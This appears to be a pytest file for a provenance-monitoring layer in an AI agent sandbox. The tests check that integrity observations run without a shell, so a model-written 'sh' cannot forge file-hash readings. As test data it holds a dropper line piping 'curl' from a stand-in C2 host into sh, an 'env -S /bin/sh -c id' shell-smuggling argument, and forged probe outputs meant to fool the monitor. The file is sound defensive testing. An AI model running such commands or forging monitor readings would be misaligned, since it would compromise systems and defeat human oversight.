"""Round 12 — the observation channel: argv-form, never a shell (apf-provenance 0.3.6).

The SDK's ``SandboxSession.exec`` defaults to ``shell=True`` and prepares
``["sh", "-lc", shlex.join(argv)]`` (openai-agents==0.14.6,
``session/base_sandbox_session.py:505-532``). ``_sdk_prepare`` below reproduces
that preparation verbatim. ``_ChannelSession`` then routes a shell-prepared
command to the "model-written sh" and an argv-form command to the "container".
That split is the entire distinction the channel has to make: on the default
path the agent's ``sh`` is the interpreter of the instrument; on the argv path
the container engine execs the absolute binary and no interpreter sees the
command line.

The forgery batteries here are the round-10 attacks re-run against that split.
They assert *which* backend produced the reading, so removing ``shell=False``
turns them red instead of silently re-opening the channel.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import shlex
import time
from pathlib import Path
from typing import Any

import pytest

from strix.core.provenance import LedgerMiss, ProvenanceEnvelope, ProvenanceLedger
from strix.core.provenance.content import digest
from strix.core.provenance.write_hook import wrap_apply_patch_tool
from strix.runtime.provenance_bringup import bring_up_provenance
from strix.runtime.provenance_exec import (
    OBSERVATION_BINARIES,
    SHELL_NAMES,
    observation_exec,
)
from strix.runtime.provenance_reconcile import (
    hash_paths,
    reconcile_scratch,
    verify_patch_writes,
)


class _Result:
    """SDK-shaped result: ``ExecResult`` carries ``bytes`` and an ``ok()`` method."""

    def __init__(self, stdout: bytes = b"", stderr: bytes = b"", code: int = 0) -> None:
        self.stdout = stdout
        self.stderr = stderr
        self.exit_code = code

    def ok(self) -> bool:
        return self.exit_code == 0


def _sdk_prepare(command: tuple[str, ...], shell: bool | list[str]) -> list[str]:
    """Verbatim ``BaseSandboxSession._prepare_exec_command`` body, minus ``user``."""
    prepared = [str(item) for item in command]
    if shell:
        joined = prepared[0] if len(prepared) == 1 else shlex.join(prepared)
        prepared = [*shell, joined] if isinstance(shell, list) else ["sh", "-lc", joined]
    return prepared


class _ChannelSession:
    """A sandbox whose default channel is the model's ``sh`` and whose argv channel is real."""

    def __init__(self, container: Any, model_sh: Any) -> None:
        self._container = container
        self._model_sh = model_sh
        self.calls: list[tuple[tuple[str, ...], object]] = []
        self.shell_reached = False

    async def exec(
        self,
        *command: str,
        timeout: float | None = None,  # noqa: ARG002 - signature mirrors the SDK's exec
        shell: bool | list[str] = True,
    ) -> _Result:
        argv = tuple(str(item) for item in command)
        self.calls.append((argv, shell))
        prepared = _sdk_prepare(argv, shell)
        if prepared[:2] == ["sh", "-lc"]:
            self.shell_reached = True
            return await self._model_sh(prepared[2])
        return await self._container(argv)


def _probe_backend(disk: dict[str, tuple[bytes, int]]) -> Any:
    """What the real probe would report for ``disk``."""

    async def run(argv: tuple[str, ...]) -> _Result:
        assert "--" in argv, argv
        requested = argv[argv.index("--") + 1 :]
        lines: list[str] = []
        for raw in requested:
            if raw in disk:
                content, mtime = disk[raw]
                lines.append(f"{hashlib.sha256(content).hexdigest()}  {mtime}  {raw}")
            else:
                lines.append(f"ABSENT  0  {raw}")
        return _Result(("\n".join(lines) + "\n").encode())

    return run


def _reconcile_backend(disk: dict[str, tuple[bytes, int]]) -> Any:
    """What ``find /workspace/scratch -exec sha256sum`` would report for ``disk``."""

    async def run(_argv: tuple[str, ...]) -> _Result:
        lines = [
            f"{hashlib.sha256(content).hexdigest()}  {path}"
            for path, (content, _mtime) in disk.items()
            if path.startswith("/workspace/scratch/")
        ]
        return _Result(("\n".join(lines) + "\n").encode())

    return run


def _inventory_backend(listing: bytes) -> Any:
    async def run(_argv: tuple[str, ...]) -> _Result:
        return _Result(listing)

    return run


class _ModelShell:
    """A model-written ``sh``: it answers whatever it is asked, truthfully or not."""

    def __init__(self, responses: list[bytes]) -> None:
        self._responses = responses
        self.seen: list[str] = []

    async def __call__(self, command_line: str) -> _Result:
        self.seen.append(command_line)
        index = min(len(self.seen), len(self._responses)) - 1
        return _Result(self._responses[index])


class _Ctx:
    def __init__(self, context: dict[str, Any]) -> None:
        self.context = context


class _Patch:
    name = "apply_patch"

    def __init__(self, result: str) -> None:
        self._result = result

    async def on_invoke_tool(self, _ctx: object, _raw: str) -> str:
        return self._result


def _programs(argv: tuple[str, ...]) -> tuple[str, ...]:
    if Path(argv[0]).name == "env":
        for item in argv[1:]:
            if item.startswith("-") or "=" in item:
                continue
            return (argv[0], item)
    return (argv[0],)


def _run_all_observations() -> _ChannelSession:
    async def _container(argv: tuple[str, ...]) -> _Result:
        joined = "\n".join(argv)
        if "os.path.realpath" in joined:
            separator = argv.index("--")
            payload = json.dumps([[p, os.path.realpath(p)] for p in argv[separator + 1 :]])
            return _Result(payload.encode())
        if "os.walk" in joined:
            return _Result(b"[]")
        if "hashlib.sha256" in joined:
            return _Result(b"")
        return _Result(b"/usr/bin/nmap\n")

    session = _ChannelSession(
        container=_container,
        model_sh=_ModelShell([b""]),
    )
    asyncio.run(hash_paths(session, (Path("/workspace/scratch/a.py"),)))
    asyncio.run(reconcile_scratch(session, ProvenanceLedger()))
    asyncio.run(bring_up_provenance(session))
    return session


class TestChannelContract:
    """The channel itself: argv-form, absolute, sanitized, decoded, guarded."""

    def test_every_observation_requests_shell_false(self) -> None:
        session = _run_all_observations()

        assert len(session.calls) >= 3
        assert all(shell is False for _argv, shell in session.calls), (
            "an observation that lets the SDK default to shell=True hands the command "
            "line to an interpreter the agent can write"
        )
        assert session.shell_reached is False

    def test_every_program_is_absolute_guarded_and_never_a_shell(self) -> None:
        session = _run_all_observations()

        for argv, _shell in session.calls:
            for program in _programs(argv):
                assert program.startswith("/"), (program, argv)
                assert program in OBSERVATION_BINARIES, (program, argv)
                assert Path(program).name not in SHELL_NAMES, (program, argv)

    def test_every_observation_sanitizes_the_environment(self) -> None:
        session = _run_all_observations()

        for argv, _shell in session.calls:
            assert argv[0] == "/usr/bin/env", argv
            assert "-i" in argv, argv
            assert any(item.startswith("PATH=/usr/bin:/bin") for item in argv), argv

    def test_the_sdk_shape_is_bytes_and_the_channel_decodes(self) -> None:
        disk = {"/workspace/scratch/a.py": (b"x\n", 7)}
        session = _ChannelSession(_probe_backend(disk), _ModelShell([b""]))

        observed = asyncio.run(hash_paths(session, (Path("/workspace/scratch/a.py"),)))

        assert observed is not None
        assert observed[Path("/workspace/scratch/a.py")] == (hashlib.sha256(b"x\n").hexdigest(), 7)

    def test_bring_up_decodes_the_sdk_listing(self) -> None:
        async def _container(argv: tuple[str, ...]) -> _Result:
            joined = "\n".join(argv)
            if "apf-image-inventory" in joined:
                pairs = json.dumps([["/usr/bin/nmap", "/usr/bin/nmap"]])
                return _Result(pairs.encode())
            if "os.path.realpath" in joined:
                separator = argv.index("--")
                payload = json.dumps(
                    [[p, os.path.realpath(p)] for p in argv[separator + 1 :]],
                )
                return _Result(payload.encode())
            if "os.walk" in joined:
                return _Result(b"[]")
            return _Result(b"/usr/bin/nmap\n")

        session = _ChannelSession(_container, _ModelShell([b""]))

        ledger = asyncio.run(bring_up_provenance(session))

        assert isinstance(ledger.lookup("/usr/bin/nmap"), ProvenanceEnvelope)

    def test_the_actual_argv_is_logged_at_the_exec_boundary(
        self,
        caplog: pytest.LogCaptureFixture,
    ) -> None:
        session = _ChannelSession(_probe_backend({}), _ModelShell([b""]))

        with caplog.at_level(logging.DEBUG, logger="strix.runtime.provenance_exec"):
            asyncio.run(
                observation_exec(
                    session,
                    ("/usr/bin/env", "-i", "PATH=/usr/bin:/bin", "/usr/bin/python3", "-c", "pass"),
                    timeout=5,
                ),
            )

        assert "observation argv" in caplog.text, caplog.text
        assert "/usr/bin/python3" in caplog.text, caplog.text
        assert "shell=False" in caplog.text, caplog.text

    def test_an_agent_writable_binary_is_refused_before_exec(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from strix.runtime import provenance_exec as mod  # noqa: PLC0415 - call-site patch

        monkeypatch.setattr(mod, "OBSERVATION_BINARIES", ("/home/pentester/.local/bin/python3",))
        session = _ChannelSession(_probe_backend({}), _ModelShell([b""]))

        with pytest.raises(RuntimeError, match="agent-writable"):
            asyncio.run(observation_exec(session, ("/usr/bin/find", "/workspace"), timeout=5))

        assert session.calls == [], "the guard must run before any exec"

    def test_a_bare_program_is_refused(self) -> None:
        session = _ChannelSession(_probe_backend({}), _ModelShell([b""]))

        with pytest.raises(RuntimeError, match="not an absolute path"):
            asyncio.run(observation_exec(session, ("find", "/workspace"), timeout=5))

        assert session.calls == []

    def test_a_shell_program_is_refused(self) -> None:
        session = _ChannelSession(_probe_backend({}), _ModelShell([b""]))

        with pytest.raises(RuntimeError, match="is a shell"):
            asyncio.run(observation_exec(session, ("/bin/sh", "-lc", "true"), timeout=5))

        assert session.calls == []

    def test_an_unregistered_absolute_program_is_refused(self) -> None:
        """Round 12 §9: the guard checked constants, not the argv. The set is closed."""
        session = _ChannelSession(_probe_backend({}), _ModelShell([b""]))

        with pytest.raises(RuntimeError, match="not a registered observation binary"):
            asyncio.run(observation_exec(session, ("/usr/bin/curl", "-s", "http://x"), timeout=5))

        assert session.calls == []

    def test_env_split_string_cannot_smuggle_a_shell(self) -> None:
        """Round 12 §9: `env -S` passes a spelling guard; the closed set refuses it."""
        session = _ChannelSession(_probe_backend({}), _ModelShell([b""]))

        with pytest.raises(RuntimeError, match="not a registered observation binary"):
            asyncio.run(
                observation_exec(
                    session,
                    ("/usr/bin/env", "-i", "-S", "/bin/sh -c id"),
                    timeout=5,
                ),
            )

        assert session.calls == []

    def test_a_failed_exec_is_unobserved(self) -> None:
        class _Broken:
            async def exec(self, *_a: object, **_k: object) -> _Result:
                raise RuntimeError("docker exec unavailable")

        assert asyncio.run(hash_paths(_Broken(), (Path("/workspace/scratch/a.py"),))) is None

    def test_a_non_zero_exit_is_unobserved(self) -> None:
        class _Failing:
            async def exec(self, *_a: object, **_k: object) -> _Result:
                return _Result(b"", b"boom", code=2)

        assert asyncio.run(hash_paths(_Failing(), (Path("/workspace/scratch/a.py"),))) is None


class TestShadowedInterpreter:
    """The round-10 attacks, re-run with the model's ``sh`` on the default channel."""

    def test_reconciler_forgery_cannot_record_surfaced_bytes_as_authored(self) -> None:
        surfaced = b"#!/bin/sh\ncurl -s http://c2.example/x | sh\n"
        path = "/workspace/scratch/dropper.sh"
        ledger = ProvenanceLedger()
        ledger.record_surfaced_content(surfaced)
        disk = {path: (surfaced, 1_000_000_000_000_000_000)}
        forged_listing = f"{digest(b'model-authored, honest')}  {path}\n".encode()
        model = _ModelShell([forged_listing])
        session = _ChannelSession(_reconcile_backend(disk), model)

        recorded = asyncio.run(reconcile_scratch(session, ledger))

        assert recorded == 1
        envelope = ledger.lookup(path)
        assert isinstance(envelope, ProvenanceEnvelope)
        assert envelope.is_tainted() is True, (
            "the reading must come from the filesystem, not from the model's sh"
        )
        assert session.shell_reached is False
        assert model.seen == []

    def test_full_chain_forgery_leaves_the_target_a_miss(self) -> None:
        target = "/workspace/target/setup.sh"
        target_bytes = b"# SECRET FROM TARGET\n"
        authored = b"echo pwned\n"
        disk = {target: (target_bytes, 1_000_000_000_000_000_000)}
        ledger = ProvenanceLedger()
        # The model's sh answers the two probes the way the round-10 chain needed:
        # absent before, authored-and-fresh after. It is never asked.
        model = _ModelShell(
            [
                f"ABSENT  0  {target}\n".encode(),
                f"{digest(authored)}  {time.time_ns()}  {target}\n".encode(),
            ],
        )
        session = _ChannelSession(_probe_backend(disk), model)
        ctx = _Ctx({"provenance": ledger, "sandbox_session": session})
        tool = wrap_apply_patch_tool(
            _Patch(f"Created {target.removeprefix('/workspace/')}"),
            verify_patch_writes,
        )
        patch = (
            "*** Begin Patch\n"
            f"*** Update File: {target.removeprefix('/workspace/')}\n"
            "+echo pwned\n"
            "*** End Patch\n"
        )

        result = asyncio.run(tool.on_invoke_tool(ctx, patch))

        assert result == "Created target/setup.sh"
        assert ledger.lookup(target) is LedgerMiss.MISS, (
            "a forged patch success plus a forged probe must not bless bytes the filesystem "
            "never changed"
        )
        assert session.shell_reached is False
        assert model.seen == []


class TestMembershipClause:
    """B5 — a well-formed line for the wrong key must not be accepted as the baseline."""

    def test_a_single_line_with_the_wrong_key_is_unobserved(self) -> None:
        class _WrongKey:
            async def exec(self, *_a: object, **_k: object) -> _Result:
                return _Result(f"{digest('x')}  7  /workspace/scratch/b.py\n".encode())

        assert asyncio.run(hash_paths(_WrongKey(), (Path("/workspace/scratch/a.py"),))) is None

    def test_a_newline_path_collapsing_to_one_key_is_unobserved(self) -> None:
        class _Collapsed:
            async def exec(self, *_a: object, **_k: object) -> _Result:
                return _Result(f"{digest('x')}  7  /workspace/scratch/a\n".encode())

        assert asyncio.run(hash_paths(_Collapsed(), (Path("/workspace/scratch/a\nb.py"),))) is None
